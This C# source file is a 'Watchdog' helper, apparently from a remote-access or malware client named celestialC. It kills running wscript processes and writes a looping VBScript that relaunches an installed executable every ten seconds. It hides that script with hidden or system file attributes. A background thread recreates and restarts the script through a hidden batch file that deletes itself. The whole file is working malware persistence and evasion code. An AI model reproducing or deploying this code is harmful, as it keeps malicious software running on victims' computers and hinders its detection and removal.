using Microsoft.VisualBasic.Devices;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Xml.Linq;

namespace celestialC.Helper
{
    public static class Watchdog
    {
        public static void setup()
        {
            Process[] pname = Process.GetProcessesByName("wscript");
            foreach (Process p in pname) { p.Kill(); }
            string script = Environment.ExpandEnvironmentVariables(Settings.Watchdogloc) + "\\" + Settings.Watchdogname;
            if(File.Exists(script))
            {
                File.Delete(script);
                Thread.Sleep(100);
            }
            if (Methods.isRoot())
            {
                return;
            }
            using (StreamWriter sw = new StreamWriter(script))
            {
                sw.WriteLine("On Error Resume Next");
                sw.WriteLine("Do while true");
                sw.WriteLine("CreateObject(\"WScript.Shell\").Exec \"" + Environment.ExpandEnvironmentVariables(Settings.InstallFolder) + "\\" + Settings.InstallSubFolder + "\\" + Settings.InstallName + "\"");
                sw.WriteLine("WScript.Sleep(10000)");
                sw.WriteLine("Loop");
                sw.Close();
            }

            if (Convert.ToBoolean(Settings.HideEverything) && Convert.ToBoolean(Settings.HideEverythingSys))
            {
                File.SetAttributes(script, FileAttributes.Hidden | FileAttributes.System);
            }
            else if (Convert.ToBoolean(Settings.HideEverything) && !Convert.ToBoolean(Settings.HideEverythingSys))
                File.SetAttributes(script, FileAttributes.Hidden);
            else if (!Convert.ToBoolean(Settings.HideEverything) && Convert.ToBoolean(Settings.HideEverythingSys))
                File.SetAttributes(script, FileAttributes.System);

            Thread startThread = new Thread(() =>
            {
                while (true)
                {
                    try
                    {
                        Process[] processes = Process.GetProcessesByName("wscript");
                        if (processes.Length == 0)
                        {
                            if(!File.Exists(script))
                            {
                                using (StreamWriter sw = new StreamWriter(script))
                                {
                                    sw.WriteLine("On Error Resume Next");
                                    sw.WriteLine("Do while true");
                                    sw.WriteLine("CreateObject(\"WScript.Shell\").Exec \"" + Environment.ExpandEnvironmentVariables(Settings.InstallFolder) + "\\" + Settings.InstallSubFolder + "\\" + Settings.InstallName + "\"");
                                    sw.WriteLine("WScript.Sleep(10000)");
                                    sw.WriteLine("Loop");
                                }
                                if (Convert.ToBoolean(Settings.HideEverything) && Convert.ToBoolean(Settings.HideEverythingSys))
                                {
                                    File.SetAttributes(script, FileAttributes.Hidden | FileAttributes.System);
                                }
                                else if (Convert.ToBoolean(Settings.HideEverything) && !Convert.ToBoolean(Settings.HideEverythingSys))
                                    File.SetAttributes(script, FileAttributes.Hidden);
                                else if (!Convert.ToBoolean(Settings.HideEverything) && Convert.ToBoolean(Settings.HideEverythingSys))
                                    File.SetAttributes(script, FileAttributes.System);
                            }
                            string batch = Environment.ExpandEnvironmentVariables(Settings.Watchdogloc) + "\\" + Settings.Watchdogname + ".bat";
                            using (StreamWriter sw = new StreamWriter(batch))
                            {
                                sw.WriteLine("@echo off");
                                sw.WriteLine("chcp 65001");
                                sw.WriteLine("START " + "\"" + "\" " + "\"" + script + "\"");
                                sw.WriteLine("DEL " + "\"" + Environment.ExpandEnvironmentVariables(Settings.Watchdogloc) + "\\" + Settings.Watchdogname + ".bat" + "\"" + " /f /q");
                            }

                            Process.Start(new ProcessStartInfo()
                            {
                                FileName = batch,
                                CreateNoWindow = true,
                                ErrorDialog = false,
                                UseShellExecute = false,
                                WindowStyle = ProcessWindowStyle.Hidden
                            });
                        }
                    }
                    catch
                    { }
                    Thread.Sleep(15000);
                }
            });
            startThread.IsBackground = true;
            startThread.Start();
        }
    }
}
